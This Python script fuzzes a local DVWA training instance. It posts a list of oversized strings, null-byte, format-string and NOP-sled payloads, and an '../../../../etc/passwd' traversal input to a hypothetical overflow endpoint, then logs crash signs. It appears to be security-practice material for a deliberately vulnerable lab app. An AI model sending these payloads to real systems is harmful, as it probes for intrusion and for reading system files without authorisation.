import requests
from bs4 import BeautifulSoup
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_buffer_overflow(session, base_url):
    # Define payloads to test buffer overflow and bypass input sanitization
    payloads = [
        'A' * 100,           # Small payload
        'A' * 500,           # Larger payload
        'A' * 1000,          # Potentially dangerous size
        'A' * 5000,          # Likely to cause overflow
        'A' * 10000,         # Very large payload to test the limits
        'A' * 50000,         # Extremely large payload
        '%00' * 100,         # Null byte injection
        '../../../../etc/passwd',  # Directory traversal attempt
        'A' * 4096 + 'B' * 1000,   # Mixed characters to disrupt pattern matching
        'A' * 2048 + '%n' * 50,    # Format string injection pattern
        'A' * 1024 + '\x90' * 100, # No-op sled (for overflows that lead to shellcode execution)
    ]
    
    endpoint = 'vulnerabilities/overflow/'  # Hypothetical vulnerable endpoint

    for i, payload in enumerate(payloads):
        data = {'input': payload, 'Submit': 'Submit'}
        try:
            response = session.post(base_url + endpoint, data=data, timeout=10)
            logging.info(f"Payload {i+1}: Sent payload of size {len(payload)}")

            # Check response status and content for signs of buffer overflow
            if response.status_code == 500:
                logging.warning(f"Buffer Overflow likely detected at {base_url}{endpoint} with payload size {len(payload)}.")
            elif "Segmentation fault" in response.text or "Exception" in response.text:
                logging.error(f"Application crash detected at {base_url}{endpoint} with payload size {len(payload)}. Buffer overflow vulnerability is present.")
            else:
                logging.info(f"No obvious Buffer Overflow detected at {base_url}{endpoint} with payload size {len(payload)}.")
        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed for payload {i+1} with size {len(payload)}: {e}")

# Example usage
if __name__ == "__main__":
    session = requests.Session()
    base_url = "http://127.0.0.1/DVWA/"  # Adjust for local DVWA instance
    
    # Ensure the session is logged in and security level is set to low
    from set_security import set_dvwa_security
    if set_dvwa_security(session, base_url, 'low'):
        test_buffer_overflow(session, base_url)
